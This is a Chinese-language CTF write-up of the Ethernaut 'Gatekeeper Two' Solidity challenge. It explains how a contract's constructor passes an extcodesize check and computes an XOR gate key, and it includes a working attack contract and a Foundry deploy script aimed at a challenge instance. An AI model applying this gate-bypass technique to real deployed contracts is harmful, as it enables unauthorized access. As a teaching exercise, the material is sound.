# Gatekeeper-Two 

# Gatekeeper-Two wp

## 目标合约

目的：**成为entrant**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

## 目标合约分析

目标合约里包含一个函数`enter`和三个修饰符`gateone`,`gatetwo`,`gatethree`

### enter核心函数

内含三个修饰符`gateone`,`gatetwo`,`gatethree`，每个修饰符都有它的require，只有都满足了才会执行函数体，成为entrant

### gateone

EOA想要调用目标合约,但是这里要求

```solidity
 require(msg.sender != tx.origin);
        _;
```

所以需要**间接调用**,EOA调用攻击合约,攻击合约调用目标合约

这样\*\*`msg.sender`是攻击合约\*\*,`tx.original`是EOA,满足gateone的条件

### gatetwo

```solidity
uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
```

`extcodesize`**作用是**\*\*<font style="background-color:#f3bb2f;">检查 msg.sender 这个地址上有没有部署代码</font>\*\*\*\*（非合约账户代码大小为 0）\*\*。也就是：

* 如果 caller() 是一个已经部署好的合约地址，extcodesize > 0
* 如果 caller() 是一个 外部钱包地址（EOA） 或者一个 **构造中的合约**，那 extcodesize 会是 0。

#### 这个构造中的合约地址我总卡住,这里重点理解下:

构造函数就是攻击合约里的这个

```solidity
constructor(address addr) {
        target = GatekeeperTwo(addr);
        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        target.enter(key);
        require(target.entrant() == msg.sender, "attack no");
    }
```

它没有函数名,**只在合约部署的时候执行一次**,之后就再也不会执行

攻击合约调用构造函数的时候，合约还没部署，因为这构造函数就是用来部署合约的，而部署的过程中正好把gatetwo的条件过了(就是extcodesize = 0) 所以就行了  这个caller就是攻击合约的地址（在构造函数内，攻击合约自己就是msg.sender），`extcodesize`就是在检查攻击合约有没有被部署

### gatethree

```solidity
uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
```

* `abi.encodePacked(msg.sender)` 是把地址编码成紧凑字节数组（20字节）
* `keccak256(...)` 对它哈希，返回 32 字节的 bytes32
* `bytes8(...)` 取哈希的前 8 字节
* `uint64(...)` 再把那 8 字节转换成一个 uint64

```solidity
^ uint64(_gateKey) == type(uint64).max);
```

* `^` 是按位**异或**运算符(两个相同的二进制位异或为 0，不同则为 1)
* `type(uint64).max` = `0xFFFFFFFFFFFFFFFF`，也就是 `2^64 - 1`
* 表示 64 位无符号整数的最大值

这一句整体意思可以理解为:**攻击者地址哈希(动词)出来的前8字节，与传入的 **`_gateKey`** 做**\*\*<font style="background-color:#f3bb2f;">异或</font>\*\***后，必须恰好等于 0xFFFFFFFFFFFFFFFF**

(异或去翻笔记)

！我老卡住是因为有点不懂这个`_gatekey`和攻击合约里自己写的那个`key`是不是一个东西,变了名字以后还能不能用

现在有点明白,这个 `_gateKey` 是个 `bytes8` 类型的 **<font style="background-color:#f3bb2f;">形参</font>**（参数变量名),`key`才是攻击合约里构造出来的\*\*<font style="background-color:#f3bb2f;">实参</font>\*\*

function enter(bytes8 \_gateKey) 里那个 \_gateKey 是 形参，就是 函数声明的变量名，这个变量名可以叫 \_gatekey，也可以叫别的，它在等着我们输入一个bytes8  类型的数，然后我们在下文中定义的 key，key是有实际的数了，所以我们会叫他实参

攻击合约里

```solidity
bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
```

这一句就是构造了一个实参`key`,`key`实际上是通过等号后边这一长串算出来的

## 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./Counter.sol";

contract Attack {
    GatekeeperTwo public target;//target是一个变量，用来存放目标合约的地址

    constructor(address addr) {//构造函数
        target = GatekeeperTwo(addr);
        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));//key是一个局部变量
        target.enter(key);//直接攻击调用enter
        require(target.entrant() == msg.sender, "attack no");
    }
}
```

## 脚本

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script{//Attacksc是脚本合约名
    function run() external {
        vm.startBroadcast();
        Attack attack  = new Attack(0x7650345B4317e0D311737A0AdfE178050e02AFCc);
        //Attack是攻击合约的合约名,attack是变量,合约实例化
        vm.stopBroadcast();
    }
}
```


> 更新: 2025-07-09 11:27:19  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/gbnqdcgyztztg3kh>